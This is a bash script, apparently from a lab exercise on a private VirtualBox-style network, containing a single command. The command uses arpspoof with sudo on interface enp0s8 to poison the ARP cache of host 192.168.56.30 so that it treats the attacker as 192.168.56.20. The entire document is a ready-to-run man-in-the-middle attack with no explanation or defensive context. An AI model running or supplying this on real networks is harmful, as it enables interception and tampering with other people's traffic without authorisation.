#!/bin/bash

sudo arpspoof -i enp0s8 -t 192.168.56.30 192.168.56.20

